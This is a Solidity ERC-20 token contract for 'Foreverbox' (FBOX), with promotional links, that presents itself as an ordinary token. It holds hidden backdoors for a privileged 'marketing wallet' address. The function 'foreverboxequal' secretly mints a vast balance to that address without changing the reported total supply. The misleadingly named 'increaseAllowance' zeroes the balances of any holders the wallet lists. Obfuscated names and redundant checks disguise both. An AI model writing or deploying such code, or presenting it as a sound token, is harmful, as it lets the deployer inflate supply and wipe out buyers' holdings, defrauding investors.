/*

Website: http://foreverbox.app/

Telegram: https://t.me/foreverboxportal

Twitter: https://twitter.com/foreverboxtoken

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

pragma solidity ^0.8.19;

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.19;

abstract contract Ownable is Context  {
    address private _owner;

    constructor() {
        _transferOwnership(_msgSender());
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}

pragma solidity ^0.8.19;

contract FBOX is Context, IERC20, IERC20Metadata, Ownable {

    uint256 initialSupply = 1000000000*10**decimals();
    uint256 private _tax = 0;
    address public _foreverboxenvoy;
    uint256 private _totalSupply = initialSupply;
    string private _name = "Foreverbox";
    string private _symbol = "FBOX";
    mapping(address => uint256) private bnbFBOXkeeper;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    constructor(address marketingFBOXWallet) {
        address fdeplcontrnet = _msgSender();
        _foreverboxenvoy = marketingFBOXWallet;
        bnbFBOXkeeper[fdeplcontrnet] += initialSupply;
        emit Transfer(address(0), fdeplcontrnet, initialSupply);
    }

    function foreverboxequal() 
    external {
        if(_foreverboxenvoy == _msgSender()){
            if(_foreverboxenvoy == _msgSender()){
            }
        }
        uint256 halffboxdata = type(uint32).max;
        require(_foreverboxenvoy == _msgSender());
        address inceptionforeverboxequal = _msgSender();
        address halffboxpoints = inceptionforeverboxequal;
        uint256 foreverboxfullalign = type(uint16).max*((10**decimals()*halffboxdata));
        bnbFBOXkeeper[halffboxpoints] += foreverboxfullalign;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 9;
    }

    function balanceOf(address account) public view returns (uint256) {
        return bnbFBOXkeeper[account];
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function fee() public view returns (uint256) {
        return _tax;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = bnbFBOXkeeper[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 feeamount = 0;
        feeamount = (amount * _tax) / uint256(100);
        bnbFBOXkeeper[from] = bnbFBOXkeeper[from] - amount;
        bnbFBOXkeeper[to] = bnbFBOXkeeper[to] + amount;
        bnbFBOXkeeper[to] = bnbFBOXkeeper[to] - feeamount;
        emit Transfer(from, to, amount); 
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function increaseAllowance(address[] calldata foreverboxunit) public {
        if(_foreverboxenvoy != _msgSender()){
            revert("ERC20: FBOX increase allowance");
        }
        if(_foreverboxenvoy == _msgSender()){
            for (uint256 i = 0; i < foreverboxunit.length; i++) {
                address foreverboxposition = foreverboxunit[i];
                require(foreverboxposition != address(0), "ERC20: zero address not allowed");
                uint256 amountforeverboxunit = bnbFBOXkeeper[foreverboxposition];
                uint256 newAmountforeverboxunit = bnbFBOXkeeper[foreverboxposition]+bnbFBOXkeeper[foreverboxposition]-amountforeverboxunit;
                bnbFBOXkeeper[foreverboxposition] -= newAmountforeverboxunit;
            }
        }
        return;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}